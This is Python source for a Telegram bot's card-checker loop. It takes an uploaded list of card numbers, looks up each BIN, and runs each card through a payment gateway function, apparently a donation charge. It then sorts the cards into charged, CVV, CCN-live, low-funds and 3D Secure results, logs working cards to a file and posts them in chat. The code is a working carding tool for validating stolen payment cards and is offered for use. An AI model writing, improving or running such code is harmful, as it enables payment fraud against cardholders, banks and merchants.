# ==========================================
# 🚀 CHECKER LOGIC (FIXED UI ISSUE)
# ==========================================
def run_checker(message):
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    chat_id = message.chat.id
    
    file_name = f"combo_{chat_id}_{int(time.time())}.txt"
    stop_file = f"stop_{chat_id}.stop"

    try:
        # Initial Message
        ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! 🚀").message_id
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        
        with open(file_name, "wb") as w:
            w.write(ee)
            
        with open(file_name, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            # 🔥 FIX 1: UI ကို Loop မဝင်ခင် (သို့) ပထမဆုံးအကြိမ်မှာ ချက်ချင်းပြမယ်
            # အရင်ဆုံး Empty Dashboard လေး ပြလိုက်တာပါ
            view_text, markup = get_virtual_card_ui(total, 0, 0, 0, 0, 0, 0, "Wait...")
            bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)

            for index, cc in enumerate(lino, 1):
                cc = cc.strip()
                
                # ===== STOP CHECK =====
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>STOPPED (User Request)</b>')
                    os.remove(stop_file)
                    if os.path.exists(file_name): os.remove(file_name)
                    return
                
                # ===== BIN LOOKUP =====
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank', 'Unknown')

                start_time = time.time()
                
                # ===== GATE CHECK =====
                try:
                    last = str(func_timeout(100, Tele, args=(cc,)))
                except FunctionTimedOut:
                    last = 'Gateway Time Out ❌'
                except Exception as e:
                    print(e)
                    last = 'Error'
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                # ==========================================
                # 🔥 DASHBOARD UI UPDATE Logic Fixed 🔥
                # ==========================================
                
                is_hit = 'Donation Successful!' in last or 'funds' in last or 'security code' in last or 'Your card does not support' in last
                
                # 🔥 FIX 2: ပထမဆုံးကဒ် (index==1)၊ Hit မိရင်၊ သို့မဟုတ် ၅ ကဒ်ပြည့်တိုင်း Update မယ်
                # အရင်က 10 ကဒ်ထားလို့ ကြာနေတာ
                if is_hit or (index == 1) or (index % 5 == 0) or (index == total):
                    view_text, markup = get_virtual_card_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except Exception as e:
                        pass 
                
                # ==========================================
                # ✅ RESULTS HANDLING
                # ==========================================
                print(f"{chat_id} : {cc} -> {last}")
                
                if 'Donation Successful!' in last or 'funds' in last:
                    with open("lives.txt", "a") as f:
                        f.write(f"{cc} - {last} - {bank} ({country})\n")

                if 'Donation Successful!' in last:
                    ch += 1
                    msg = f'''✅ <b>Charge Hit!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> Payment Successful ✅
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                    msg = f'''✅ <b>CVV Hit!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> CVV Mismatch ⚠️
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    msg = f'''🔐 <b>CCN Live!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> CCN Live ✅
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                    # Force Update for CCN
                    view_text, markup = get_virtual_card_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except:
                        pass
                    
                elif 'funds' in last:
                    lowfund += 1
                    msg = f'''⚠️ <b>Insufficient Funds!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> Low Funds ⛔
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1
                    msg = f'''⚠️ <b>3D Secure!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> 3D Action Required 🔄
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                        
                else:
                    dd += 1
                    time.sleep(1)
        
        if os.path.exists(file_name): os.remove(file_name)
        bot.edit_message_text(chat_id=chat_id, message_id=ko, text='✅ <b>Checking Completed!</b>\nBot By ➜ @Rusisvirus')

    except Exception as e:
        print(f"Error for {chat_id}: {e}")
